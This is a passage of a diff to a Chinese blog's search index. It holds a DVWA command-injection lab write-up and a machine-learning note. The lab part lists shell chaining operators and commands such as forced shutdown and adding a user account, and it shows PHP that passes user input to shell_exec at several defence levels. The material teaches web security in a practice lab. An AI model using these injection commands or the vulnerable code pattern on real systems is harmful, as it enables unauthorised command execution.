+<h4 id="3-Command-injection"><a href="#3-Command-injection" class="headerlink" title="3. Command injection"></a>3. Command injection</h4><p>攻击之前首先将防御级别改低</p>
+<p><img src="/2023/10/13/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/image-20230711214441876.png" alt="image-20230711214441876"></p>
+<p>输入whoami类似的</p>
+<p><img src="/2023/10/13/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/image-20230711214557276.png" alt="image-20230711214557276"></p>
+<h4 id="4-防御策略"><a href="#4-防御策略" class="headerlink" title="4. 防御策略"></a>4. 防御策略</h4><p>过滤管道符：|，&amp;，；，||，&amp;&amp;符号替换为空格或者检测到时便停止程序</p>
+<h4 id="5-防御-low"><a href="#5-防御-low" class="headerlink" title="5. 防御 low"></a>5. 防御 low</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>未做任何的过滤</p>
+<h4 id="6-防御-medium"><a href="#6-防御-medium" class="headerlink" title="6. 防御 medium"></a>6. 防御 medium</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the characters in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>只对&amp;&amp;和；做了防御</p>
+<h4 id="7-防御-high"><a href="#7-防御-high" class="headerlink" title="7. 防御 high"></a>7. 防御 high</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the characters in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>单纯进行了拓宽，效果不好，注意“| ”后是有一个空格的，“|”不带空格的拦截不了，开发时注意</p>
+<h4 id="8-防御-impossible"><a href="#8-防御-impossible" class="headerlink" title="8. 防御 impossible"></a>8. 防御 impossible</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    <span class="variable">$octet</span> = <span class="title function_ invoke__">explode</span>( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">sizeof</span>( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>重点是其中的</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>	<span class="variable">$target</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target</span> );</span><br><span class="line"><span class="comment">// Split the IP into 4 octects</span></span><br><span class="line"><span class="number">2</span>    <span class="variable">$octet</span> = <span class="title function_ invoke__">explode</span>( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line"><span class="number">3</span>    <span class="keyword">if</span>( ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">sizeof</span>( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line"><span class="number">4</span>        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br></pre></td></tr></table></figure>
+
+<p>1.将用户输入中的反斜线去掉，防止转义字符</p>
+<p>2.将输入的Ip按照”.”分开</p>
+<p>3.判断分开的每个部分是不是都是数字并且总的数量为4</p>
+<p>4.再将4个部分的数字用三个“.”给拼接起来</p>
+]]></content>
+      <categories>
+        <category>rce</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
+      </tags>
   </entry>
   <entry>
     <title>计组复习</title>
@@ -949,10 +1099,9 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
+    <title>机器学习</title>
     <url>/2023/10/11/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<p>title: 机器学习<br>date: ‎2023‎-10‎-‎12‎ 15:32:38<br>tags: [机器学习]<br>categories: [机器学习]</p>
-<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h1><h2 id="1-1-发展"><a href="#1-1-发展" class="headerlink" title="1.1 发展"></a>1.1 发展</h2><ul>
+    <content><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h1><h2 id="1-1-发展"><a href="#1-1-发展" class="headerlink" title="1.1 发展"></a>1.1 发展</h2><ul>
 <li><p>人工智能起点：1956年，达特茅斯会议。</p>
 </li>
 <li><p>机器学习：1980年代</p>
@@ -1179,105 +1328,17 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.decomposition <span class="keyword">import</span> PCA</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PCA_demo</span>():</span><br><span class="line">    data = [[<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">9</span>], [<span class="number">5</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">6</span>]]</span><br><span class="line"></span><br><span class="line">    transfer = PCA(n_components=<span class="number">0.95</span>)</span><br><span class="line"></span><br><span class="line">    data_new = transfer.fit_transform(data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;data_new:\n&quot;</span>, data_new)</span><br></pre></td></tr></table></figure>
 
 ]]></content>
+      <categories>
+        <category>机器学习</category>
+      </categories>
+      <tags>
+        <tag>机器学习</tag>
+      </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/10/13/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<p>title: DVWA命令执行<br>date: ‎2023-7‎-‎11‎ 22:22:23<br>tags: [命令执行]<br>categories: [rce]</p>
-<h3 id="1-常见的网站漏洞"><a href="#1-常见的网站漏洞" class="headerlink" title="1. 常见的网站漏洞"></a>1. 常见的网站漏洞</h3><p>OWASP TOP 10：每年公布关于web安全的十大安全威胁报告，三年公开一次</p>
-<ul>
-<li>SQL注入（key）：渗透数据库，获取数据库数据或者控制权限</li>
-<li>XSS</li>
-<li>文件上传（key）：上传木马病毒到网站中</li>
-<li>反序列化</li>
-<li>文件包含</li>
-<li>CSRF</li>
-<li>命令执行（key）：获取命令执行的权限</li>
-<li>信息泄露</li>
-<li>XXE</li>
-<li>SSRF</li>
-<li>未授权访问</li>
-</ul>
-<span id="more"></span>
-
-
-
-<h3 id="2-DVWA靶场"><a href="#2-DVWA靶场" class="headerlink" title="2. DVWA靶场"></a>2. DVWA靶场</h3><p>OWASP的官方网站</p>
-<h4 id="1-DVMA搭建"><a href="#1-DVMA搭建" class="headerlink" title="1. DVMA搭建"></a>1. DVMA搭建</h4><ul>
-<li>PHP环境：WASP(Windows, Apache, Mysql, Php)</li>
-<li>DVWA源码:<a href="https://codeload.github.com/digininja/DVWA/zip/refs/heads/master">https://codeload.github.com/digininja/DVWA/zip/refs/heads/master</a></li>
-</ul>
-<h5 id="1-六步快速搭建（使用phpstudy-2018）"><a href="#1-六步快速搭建（使用phpstudy-2018）" class="headerlink" title="1. 六步快速搭建（使用phpstudy 2018）"></a>1. 六步快速搭建（使用phpstudy 2018）</h5><ul>
-<li><p>下载安装PHPstudy</p>
-</li>
-<li><p>将解压后的DVWA源码放在phpstudy安装目录的PHPTutorial\WWW目录下</p>
-</li>
-<li><p>进入DVMA&#x2F;config目录，将config.inc.php.dist最后的.dist后缀删除</p>
-</li>
-<li><p>打开刚刚修改的config.inc.php，修改db_user和db_password全为root</p>
-</li>
-<li><p>访问localhost&#x2F;DVMA，点击setup，然后点击最下面的Create DataBase</p>
-</li>
-<li><p>访问localhost&#x2F;DVMA，输入账号密码，admin 和 password，登录</p>
-</li>
-</ul>
-<h5 id="2-使用小皮面板"><a href="#2-使用小皮面板" class="headerlink" title="2. 使用小皮面板"></a>2. 使用小皮面板</h5><ul>
-<li>下载安装小皮面板</li>
-<li>将下载解压后的DVWA源码放在www目录下</li>
-<li>进入DVMA&#x2F;config目录，将config.inc.php.dist最后的.dist后缀删除</li>
-<li>打开刚刚修改的config.inc.php，修改db_user和db_password全为root（小皮面板使用的是内置的另一个MySql，如果之前电脑中已经安装MySql，记得改DVWA下config.inc.php中默认的MySql端口号，小皮面板中的配置也记得改）</li>
-<li>访问localhost&#x2F;DVMA，点击setup，然后点击最下面的Create DataBase</li>
-<li>访问localhost&#x2F;DVMA，输入账号密码，admin 和 password，登录</li>
-</ul>
-<h3 id="3-DVWA命令执行漏洞"><a href="#3-DVWA命令执行漏洞" class="headerlink" title="3. DVWA命令执行漏洞"></a>3. DVWA命令执行漏洞</h3><p>攻击者在执行远程的控制命令时，由于系统设置的不完善，导致攻击者可以执行一些特殊的命令，从而取得权限</p>
-<h4 id="1-常用连接符"><a href="#1-常用连接符" class="headerlink" title="1. 常用连接符"></a>1. 常用连接符</h4><ul>
-<li><p>cmd1|cmd2，无论是cmd1是否执行成功，均执行cmd2</p>
-</li>
-<li><p>cmd1;cmd2，无论是cmd1是否执行成功，均执行cmd2</p>
-</li>
-<li><p>cmd1&amp;cmd2，无论是cmd1是否执行成功，均执行cmd2</p>
-</li>
-<li><p>cmd1||cmd2，只有cmd1失败时才执行cmd2</p>
-</li>
-<li><p>cmd1&amp;&amp;cmd2，只有cmd1成功时才执行cmd2</p>
-</li>
-</ul>
-<h4 id="2-常见cmd命令"><a href="#2-常见cmd命令" class="headerlink" title="2. 常见cmd命令"></a>2. 常见cmd命令</h4><ul>
-<li>whoami：当前用户名</li>
-<li>shutdown -s -t 0：立即关机</li>
-<li>net user [username] [password] &#x2F;add 添加用户，用户名为username，密码为password</li>
-<li>type [file_name] 查看file_name文件的内容</li>
-</ul>
-<h4 id="3-Command-injection"><a href="#3-Command-injection" class="headerlink" title="3. Command injection"></a>3. Command injection</h4><p>攻击之前首先将防御级别改低</p>
-<p><img src="/2023/10/13/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/image-20230711214441876.png" alt="image-20230711214441876"></p>
-<p>输入whoami类似的</p>
-<p><img src="/2023/10/13/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/image-20230711214557276.png" alt="image-20230711214557276"></p>
-<h4 id="4-防御策略"><a href="#4-防御策略" class="headerlink" title="4. 防御策略"></a>4. 防御策略</h4><p>过滤管道符：|，&amp;，；，||，&amp;&amp;符号替换为空格或者检测到时便停止程序</p>
-<h4 id="5-防御-low"><a href="#5-防御-low" class="headerlink" title="5. 防御 low"></a>5. 防御 low</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>未做任何的过滤</p>
-<h4 id="6-防御-medium"><a href="#6-防御-medium" class="headerlink" title="6. 防御 medium"></a>6. 防御 medium</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the characters in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>只对&amp;&amp;和；做了防御</p>
-<h4 id="7-防御-high"><a href="#7-防御-high" class="headerlink" title="7. 防御 high"></a>7. 防御 high</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the characters in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span 